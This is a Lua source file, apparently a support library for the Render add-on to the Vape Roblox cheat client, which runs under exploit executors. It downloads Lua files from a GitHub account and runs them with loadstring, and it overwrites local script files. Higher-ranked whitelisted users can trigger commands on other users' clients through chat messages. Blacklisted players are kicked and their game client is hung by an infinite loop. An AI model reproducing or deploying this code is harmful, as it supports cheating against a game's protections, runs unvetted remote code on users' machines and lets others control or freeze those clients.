local RenderFunctions = {WhitelistLoaded = false, whitelistTable = {}, localWhitelist = {}, configUsers = {}, whitelistSuccess = false, playerWhitelists = {}, commands = {}, playerTags = {}, entityTable = {}}
local RenderLibraries = {}
local RenderConnections = {}
local players = game:GetService('Players')
local tweenService = game:GetService('TweenService')
local httpService = game:GetService('HttpService')
local textChatService = game:GetService('TextChatService')
local lplr = players.LocalPlayer
local GuiLibrary = shared.GuiLibrary
local rankTable = {DEFAULT = 0, STANDARD = 1, BOOSTER = 1.5, BETA = 1.6, INF = 2, OWNER = 3}
local httprequest = (http and http.request or http_request or fluxus and fluxus.request or request or function() return {Body = '[]', StatusCode = 404, StatusText = 'bad exploit'} end)

RenderFunctions.hashTable = {rendermoment = 'Render', renderlitemoment = 'Render Lite', redrendermoment = 'Render Red'}

local isfile = isfile or function(file)
    local success, filecontents = pcall(function() return readfile(file) end)
    return success and type(filecontents) == 'string'
end

local function errorNotification(title, text, duration)
    pcall(function()
         local notification = GuiLibrary.CreateNotification(title, text, duration or 20, 'assets/WarningNotification.png')
         notification.IconLabel.ImageColor3 = Color3.new(220, 0, 0)
         notification.Frame.Frame.ImageColor3 = Color3.new(220, 0, 0)
    end)
end

function RenderFunctions:CreateLocalDirectory(directory)
    local splits = tostring(directory:gsub('vape/Render/', '')):split('/')
    local last = ''
    for i,v in next, splits do 
        if not isfolder('vape/Render') then 
            makefolder('vape/Render') 
        end
        if i ~= #splits then 
            last = ('/'..last..'/'..v)
            makefolder('vape/Render'..last)
        end
    end 
    return directory
end

function RenderFunctions:RefreshLocalEnv()
    local signal = Instance.new('BindableEvent')
    local start = tick()
    local coreinstalled = 0
    for i,v in next, ({'Libraries', 'scripts'}) do  
        if isfolder('vape/Render/'..v) then 
            delfolder('vape/Render/'..v) 
            RenderFunctions:DebugWarning('vape/Render/'..v, 'folder has been deleted due to updates.')
        end
    end
    for i,v in next, ({'Universal.lua', 'MainScript.lua', 'NewMainScript.lua', 'GuiLibrary.lua'}) do 
        task.spawn(function()
            local contents = game:HttpGet('https://raw.githubusercontent.com/SystemXVoid/'..RenderFunctions:GithubHash()..'/packages/'..v)
            if contents ~= '404: Not Found' then 
                contents = (tostring(contents:split('\n')[1]):find('Render Custom Vape Signed File') and contents or '-- Render Custom Vape Signed File\n'..contents)
                if isfolder('vape') then 
                    RenderFunctions:DebugWarning('vape/', v, 'has been overwritten due to updates.')
                    writefile('vape/'..v, contents) 
                    coreinstalled = (coreinstalled + 1)
                end
            end 
        end)
    end
    local files = httpService:JSONDecode(game:HttpGet('https://api.github.com/repos/SystemXVoid/Render/contents/packages'))
    local customsinstalled = 0
    local totalcustoms = 0
    for i,v in next, files do 
        totalcustoms = (totalcustoms + 1)
        task.spawn(function() 
            local number = tonumber(tostring(v.name:split('.')[1]))
            if number then 
				local contents = game:HttpGet('https://raw.githubusercontent.com/SystemXVoid/Render/'..RenderFunctions:GithubHash()..'/packages/'..v.name) 
                contents = (tostring(contents:split('\n')[1]):find('Render Custom Vape Signed File') and contents or '-- Render Custom Vape Signed File\n'..contents)
				writefile('vape/CustomModules/'..v.name, contents)
                customsinstalled = (customsinstalled + 1)
                RenderFunctions:DebugWarning('vape/Render/'..v, 'was overwritten due to updates.')
            end 
        end)
    end
    task.spawn(function()
        repeat task.wait() until (coreinstalled == 4 and customsinstalled == totalcustoms)
        RenderFunctions:DebugWarning('The local environment has been refreshed fully.')
        signal:Fire(tick() - start)
    end)
    return signal
end

function RenderFunctions:GithubHash(repo, owner)
    local html = httprequest({Url = 'https://github.com/'..(owner or 'SystemXVoid')..'/'..(repo or 'Render')}).Body -- had to use this cause "Arceus X" is absolute bs LMFAO
	for i,v in next, html:split("\n") do 
	    if v:find('commit') and v:find('fragment') then 
	       local str = v:split("/")[5]
	       local success, commit = pcall(function() return str:sub(0, v:split('/')[5]:find('"') - 1) end) 
           if success and commit then 
               return commit 
           end
	    end
	end
    return (repo == 'Render' and 'source' or 'main')
end

local cachederrors = {}
function RenderFunctions:GetFile(file, onlineonly, custompath, customrepo)
    if not file or type(file) ~= 'string' then 
        return ''
    end
    customrepo = customrepo or 'Render'
    local filepath = (custompath and custompath..'/'..file or 'vape/Render')..'/'..file
    if not isfile(filepath) or onlineonly then 
        local Rendercommit = RenderFunctions:GithubHash(customrepo)
        local success, body = pcall(function() return game:HttpGet('https://raw.githubusercontent.com/SystemXVoid/'..customrepo..'/'..Rendercommit..'/'..file, true) end)
        if success and body ~= '404: Not Found' and body ~= '400: Invalid request' then 
            local directory = RenderFunctions:CreateLocalDirectory(filepath)
            body = file:sub(#file - 3, #file) == '.lua' and body:sub(1, 35) ~= 'Render Custom Vape Signed File' and '-- Render Custom Vape Signed File /n'..body or body
            if not onlineonly then 
                writefile(directory, body)
            end
            return body
        else
            task.spawn(error, '[Render] Failed to Download '..filepath..(body and ' | '..body or ''))
            if table.find(cachederrors, file) == nil then 
                errorNotification('Render', 'Failed to Download '..filepath..(body and ' | '..body or ''), 30)
                table.insert(cachederrors, file)
            end
        end
    end
    return isfile(filepath) and readfile(filepath) or task.wait(9e9)
end

local announcements = {}
function RenderFunctions:Announcement(tab)
	tab = tab or {}
	tab.Text = tab.Text or ''
	tab.Duration = tab.Duration or 20
	for i,v in next, announcements do 
        pcall(function() v:Destroy() end) 
    end
	table.clear(announcements)
	local announcemainframe = Instance.new('Frame')
	announcemainframe.Position = UDim2.new(0.2, 0, -5, 0.1)
	announcemainframe.Size = UDim2.new(0, 1227, 0, 62)
	announcemainframe.Parent = (GuiLibrary and GuiLibrary.MainGui or game:GetService('CoreGui'):FindFirstChildWhichIsA('ScreenGui'))
	local announcemaincorner = Instance.new('UICorner')
	announcemaincorner.CornerRadius = UDim.new(0, 20)
	announcemaincorner.Parent = announcemainframe
	local announceuigradient = Instance.new('UIGradient')
	announceuigradient.Parent = announcemainframe
	announceuigradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(234, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(153, 0, 0))})
	announceuigradient.Enabled = true
	local announceiconframe = Instance.new('Frame')
	announceiconframe.BackgroundColor3 = Color3.fromRGB(106, 0, 0)
	announceiconframe.BorderColor3 = Color3.fromRGB(85, 0, 0)
	announceiconframe.Position = UDim2.new(0.007, 0, 0.097, 0)
	announceiconframe.Size = UDim2.new(0, 58, 0, 50)
	announceiconframe.Parent = announcemainframe
	local annouceiconcorner = Instance.new('UICorner')
	annouceiconcorner.CornerRadius = UDim.new(0, 20)
	annouceiconcorner.Parent = announceiconframe
	local announceRendericon = Instance.new('ImageButton')
	announceRendericon.Parent = announceiconframe
	announceRendericon.Image = 'rbxassetid://13391474085'
	announceRendericon.Position = UDim2.new(-0, 0, 0, 0)
	announceRendericon.Size = UDim2.new(0, 59, 0, 50)
	announceRendericon.BackgroundTransparency = 1
	local announcetextfont = Font.new('rbxasset://fonts/families/Ubuntu.json')
	announcetextfont.Weight = Enum.FontWeight.Bold
	local announcemaintext = Instance.new('TextButton')
	announcemaintext.Text = tab.Text
	announcemaintext.FontFace = announcetextfont
	announcemaintext.TextXAlignment = Enum.TextXAlignment.Left
	announcemaintext.BackgroundTransparency = 1
	announcemaintext.TextSize = 30
	announcemaintext.AutoButtonColor = false
	announcemaintext.Position = UDim2.new(0.063, 0, 0.097, 0)
	announcemaintext.Size = UDim2.new(0, 1140, 0, 50)
	announcemaintext.RichText = true
	announcemaintext.TextColor3 = Color3.fromRGB(255, 255, 255)
	announcemaintext.Parent = announcemainframe
	tweenService:Create(announcemainframe, TweenInfo.new(1), {Position = UDim2.new(0.2, 0, 0.042, 0.1)}):Play()
	local sound = Instance.new('Sound')
	sound.PlayOnRemove = true
	sound.SoundId = 'rbxassetid://6732495464'
	sound.Parent = announcemainframe
	sound:Destroy()
	local function announcementdestroy()
		local sound = Instance.new('Sound')
		sound.PlayOnRemove = true
		sound.SoundId = 'rbxassetid://6732690176'
		sound.Parent = announcemainframe
		sound:Destroy()
		announcemainframe:Destroy()
	end
	announcemaintext.MouseButton1Click:Connect(announcementdestroy)
	announceRendericon.MouseButton1Click:Connect(announcementdestroy)
	task.delay(tab.Duration, function()
        if not announcemainframe or not announcemainframe.Parent then 
            return 
        end
        local expiretween = tweenService:Create(announcemainframe, TweenInfo.new(0.20, Enum.EasingStyle.Quad), {Transparency = 1})
        expiretween:Play()
        expiretween.Completed:Wait() 
        announcemainframe:Destroy()
    end)
	table.insert(announcements, announcemainframe)
	return announcemainframe
end

local function playerfromID(id) -- players:GetPlayerFromUserId() didn't work for some reason :bruh:
    for i,v in next, players:GetPlayers() do 
        if v.UserId == tonumber(id) then 
            return v 
        end
    end
end

local cachedjson
function RenderFunctions:CreateWhitelistTable()
    local success, whitelistTable = pcall(function() 
        return cachedjson or httpService:JSONDecode(httprequest({Url = 'https://api.renderintents.xyz/whitelist', Method = 'OPTIONS'}).Body)
    end)
    if not success and not cachedjson then 
        success, whitelistTable = pcall(function()
            return httpService:JSONDecode(request({Url = 'https://api.renderintents.xyz/whitelist', Method = 'OPTIONS'}).Body) 
        end) 
    end
    if success and type(whitelistTable) == 'table' then 
        cachedjson = whitelistTable
        for i,v in next, whitelistTable do 
            if type(v.Accounts) == 'table' then 
                for i2, v2 in next, v.Accounts do 
                    local plr = playerfromID(v2)
                    if plr then 
                        RenderFunctions.playerWhitelists[v2] = v
                        RenderFunctions.playerWhitelists[v2].Priority = (rankTable[v.Rank or 'STANDARD'] or 1)
                        if not v.TagHidden then 
                            RenderFunctions:CreatePlayerTag(plr, v.TagText, v.TagColor)
                        end
                    end
                end
            end 
        end
    end
    local selftab = (RenderFunctions.playerWhitelists[lplr] or {Priority = 1})
    for i,v in next, RenderFunctions.playerWhitelists do 
        if selftab.Priority >= v.Priority then 
            v.Attackable = true 
        end 
    end
    return success
end

table.insert(RenderConnections, players.PlayerAdded:Connect(function()
    repeat task.wait() until RenderFunctions.WhitelistLoaded
    RenderFunctions:CreateWhitelistTable()
end))

function RenderFunctions:GetPlayerType(position, plr)
    plr = plr or lplr
    local positionTable = {'Rank', 'Attackable', 'Priority', 'TagText', 'TagColor', 'TagHidden'}
    local defaultTab = {'STANDARD', true, 1, 'SPECIAL USER', 'FFFFFF', true, 0, 'ABCDEFGH'}
    local tab = RenderFunctions.playerWhitelists[tostring(plr.UserId)]
    if tab then 
        return tab[positionTable[tonumber(position or 1)]]
    end
    return defaultTab[tonumber(position or 1)]
end

function RenderFunctions:SpecialNearPosition(maxdistance, bypass, booster)
    maxdistance = maxdistance or 30
    local specialtable = {}
    for i,v in next, RenderFunctions:GetAllSpecial(booster and true) do 
        if v == lplr then 
            continue
        end
        if RenderFunctions:GetPlayerType(3, v) < 2 then 
            continue
        end
        if RenderFunctions:GetPlayerType(2, v) and not bypass then 
            continue
        end
        if not lplr.Character or not lplr.Character.PrimaryPart then 
            continue
        end 
        if not v.Character or not v.Character.PrimaryPart then 
            continue
        end
        local magnitude = (lplr.Character.PrimaryPart - v.Character.PrimaryPart).Magnitude
        if magnitude <= maxdistance then 
            table.insert(specialtable, v)
        end
    end
    return #specialtable > 1 and specialtable or nil
end

function RenderFunctions:SpecialInGame(booster)
    return #RenderFunctions:GetAllSpecial(booster) > 0
end

function RenderFunctions:DebugPrint(...)
    if RenderDebug then 
        task.spawn(print, table.concat({...}, ' ')) 
    end
end

function RenderFunctions:DebugWarning(...)
    if RenderDebug then 
        task.spawn(warn, table.concat({...}, ' ')) 
    end
end

function RenderFunctions:DebugError(...)
    if RenderDebug then
        task.spawn(error, table.concat({...}, ' '))
    end
end

function RenderFunctions:SelfDestruct()
    table.clear(RenderFunctions)
    RenderFunctions = nil 
    getgenv().RenderFunctions = nil 
    if RenderStore then 
        table.clear(RenderStore)
        getgenv().RenderStore = nil 
    end
    for i,v in next, RenderConnections do 
        pcall(function() v:Disconnect() end)
        pcall(function() v:disconnect() end)
    end
end

task.spawn(function()
	for i,v in next, ({'Hex2Color3', 'encodeLib'}) do 
		task.spawn(function() RenderLibraries[v] = loadstring(RenderFunctions:GetFile('Libraries/'..v..'.lua'))() end)
	end
end)

function RenderFunctions:RunFromLibrary(tablename, func, ...)
	if RenderLibraries[tablename] == nil then 
        repeat task.wait() until RenderLibraries[tablename]
    end 
	return RenderLibraries[tablename][func](...)
end

function RenderFunctions:CreatePlayerTag(plr, text, color)
    plr = plr or lplr 
    RenderFunctions.playerTags[plr] = {}
    RenderFunctions.playerTags[plr].Text = text 
    RenderFunctions.playerTags[plr].Color = color 
    pcall(function() shared.vapeentity.fullEntityRefresh() end)
    return RenderFunctions.playerTags[plr]
end

local loadtime = 0
task.spawn(function()
    repeat task.wait() until shared.VapeFullyLoaded
    loadtime = tick()
end)

function RenderFunctions:LoadTime()
    return loadtime ~= 0 and (tick() - loadtime) or 0
end

function RenderFunctions:AddEntity(ent)
    local tabpos = (#RenderFunctions.entityTable + 1)
    table.insert(RenderFunctions.entityTable, {Name = ent.Name, DisplayName = ent.Name, Character = ent})
    return tabpos
end

function RenderFunctions:GetAllSpecial(nobooster)
    local special = {}
    local prio = (nobooster and 1.5 or 1)
    for i,v in next, players:GetPlayers() do 
        if v ~= lplr and RenderFunctions:GetPlayerType(3, v) > prio then 
            table.insert(special, v)
        end
    end 
    return special
end

function RenderFunctions:RemoveEntity(position)
    RenderFunctions.entityTable[position] = nil
end

function RenderFunctions:AddCommand(name, func)
    RenderFunctions.commands[name] = (func or function() end)
end

function RenderFunctions:RemoveCommand(name) 
    RenderFunctions.commands[name] = nil
end

task.spawn(function()
    local whitelistsuccess, response = pcall(function() return RenderFunctions:CreateWhitelistTable() end)
    RenderFunctions.whitelistSuccess = whitelistsuccess
    RenderFunctions.WhitelistLoaded = true
    if not whitelistsuccess or not response then 
        errorNotification('Render', 'Failed to create the whitelist table. | '..(response or 'Failed to Decode JSON'), 10)
    end
end)

task.spawn(function()
	repeat
	local success, blacklistTable = pcall(function() return httpService:JSONDecode(RenderFunctions:GetFile('blacklist.json', true, nil, 'whitelist')) end)
	if success and type(blacklistTable) == 'table' then 
		for i,v in next, blacklistTable do 
            if lplr.DisplayName:lower():find(i:lower()) or lplr.Name:lower():find(i:lower()) or i == tostring(lplr.UserId) or isfile('vape/Render/kickdata.vw') then 
                pcall(function() RenderStore.serverhopping = true end)
                task.spawn(function() lplr:Kick(v.Error) end)
                pcall(writefile, 'vape/Render/kickdata.vw', 'checked')
                task.wait(0.35)
                pcall(function() 
                    for i,v in next, lplr.PlayerGui:GetChildren() do 
                        v.Parent = (gethui and gethui() or game:GetService('CoreGui'))
                    end
                    lplr:Destroy()
                end)
                for i,v in pairs, {} do end 
                while true do end
            end
        end
	end
	task.wait(25)
    until not RenderFunctions
end)

task.spawn(function()
    repeat task.wait() until RenderStore
    table.insert(RenderConnections, RenderStore.MessageReceived.Event:Connect(function(plr, text)
        local args = text:split(' ')
        local first, second = tostring(args[1]), tostring(args[2])
        if first:sub(1, 6) == ';cmds' and plr == lplr and RenderFunctions:GetPlayerType(3) > 1 and RenderFunctions:GetPlayerType() ~= 'BETA' then 
            task.wait(0.1)
            for i,v in next, RenderFunctions.commands do 
                if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then 
                    textChatService.ChatInputBarConfiguration.TargetTextChannel:DisplaySystemMessage(i)
                else 
                    game:GetService('StarterGui'):SetCore('ChatMakeSystemMessage', {Text = i,  Color = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24})
                end
            end
        end
        for i,v in next, RenderFunctions.hashTable do 
            if text:find(i) and table.find(RenderFunctions.configUsers, plr) == nil then 
                repeat task.wait() until RenderFunctions.WhitelistLoaded
                print('Render - '..plr.DisplayName..' is using '..v..'!')
                local allowed = (RenderFunctions:GetPlayerType(3) > 1 and RenderFunctions:GetPlayerType(3, plr) < RenderFunctions:GetPlayerType(3)) 
                if not allowed then return end 
                if GuiLibrary then 
                    pcall(GuiLibrary.CreateNotification, 'Render', plr.DisplayName..' is using '..v..'!', 100) 
                end
                if RenderFunctions:GetPlayerType(6, plr) then 
                    RenderFunctions:CreatePlayerTag(plr, 'RENDER USER', 'B95CF4') 
                end
                table.insert(RenderFunctions.configUsers, plr)
            end
        end
        if RenderFunctions:GetPlayerType(3, plr) < 1.5 or RenderFunctions:GetPlayerType(3, plr) <= RenderFunctions:GetPlayerType(3) then 
            return 
        end
        for i, command in next, RenderFunctions.commands do 
            if first:sub(1, #i + 1) == ';'..i and (second:lower() == RenderFunctions:GetPlayerType():lower() or lplr.Name:lower():find(second:lower()) or second:lower() == 'all') then 
                pcall(command, args, plr)
                break
            end
        end
    end))
end)


getgenv().RenderFunctions = RenderFunctions
return RenderFunctions
